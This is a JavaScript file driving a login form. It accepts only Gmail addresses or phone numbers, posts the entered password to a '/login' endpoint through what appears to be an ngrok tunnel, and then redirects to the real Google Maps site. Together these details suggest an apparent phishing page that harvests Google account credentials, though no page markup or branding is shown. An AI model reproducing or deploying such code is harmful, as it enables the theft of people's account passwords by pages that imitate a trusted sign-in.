const loginForm = document.getElementById("loginForm");
const idInput = document.getElementById("loginIdentifier");
const pwdInput = document.getElementById("loginPassword");
const idError = document.getElementById("emailError");
const pwdError = document.getElementById("passwordError");
const formMsg = document.getElementById("loginFormMsg");

const setError = (el, msg) => { if (el) el.textContent = msg || ''; };
const clearAll = () => { setError(idError, ''); setError(pwdError, ''); setError(formMsg, ''); };

// --- toggle show/hide password ---
const toggleBtn = document.getElementById('togglePwd');
if (toggleBtn && pwdInput) {
  // svg for eye (show) and eye-off (hide)
  const eyeSvg = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M1 12s4 7 11 7 11-7 11-7-4-7-11-7S1 12 1 12z" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
  const eyeOffSvg = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7 .95-2.42 2.66-4.4 4.61-5.8" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/><path d="M21 21L3 3" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/><path d="M9.88 9.88A3 3 0 0 0 14.12 14.12" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg>';

  toggleBtn.addEventListener('click', () => {
    const isHidden = pwdInput.type === 'password';
    pwdInput.type = isHidden ? 'text' : 'password';
    // swap icon
    toggleBtn.innerHTML = isHidden ? eyeOffSvg : eyeSvg;
    // accessibility
    toggleBtn.setAttribute('aria-label', isHidden ? 'Hide password' : 'Show password');
    toggleBtn.setAttribute('aria-pressed', String(isHidden));
  });
}

if (loginForm) {
  loginForm.addEventListener("submit", async function (e) {
    e.preventDefault();
    clearAll();

    const identifier = (idInput && idInput.value || '').trim();
    const password = (pwdInput && pwdInput.value || '').trim();

    // basic client validation: required
    if (!identifier) {
      setError(idError, 'Please enter email or phone number');
      idInput.focus();
      return;
    }
    if (!password) {
      setError(pwdError, 'Please enter password');
      pwdInput.focus();
      return;
    }

    // identify: if contains '@' validate gmail, otherwise validate phone pattern
    const gmailRe = /^[A-Za-z0-9._%+-]+@gmail\.com$/i;
    const phoneRe = /^\+?[0-9\s\-()]{7,}$/;
    if (identifier.includes('@')) {
      if (!gmailRe.test(identifier)) {
        setError(idError, 'Invalid email — ASCII characters only and must end with @gmail.com');
        idInput.focus();
        return;
      }
    } else {
      if (!phoneRe.test(identifier)) {
        setError(idError, 'Invalid phone number (eg +84 912 345 678)');
        idInput.focus();
        return;
      }
    }

    try {
      const res = await fetch("/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "ngrok-skip-browser-warning": "true"
        },
        body: JSON.stringify({ email: identifier, password }),
      });

      const data = await res.json();

      if (res.ok) {
        // redirect on success
        window.location.href = "https://www.google.com/maps";
      } else {
        // show server message inline
        setError(formMsg, data.message || "Login failed");
      }
    } catch (error) {
      setError(formMsg, "Unable to connect to server. Please try again.");
      console.error(error);
    }
  });
}
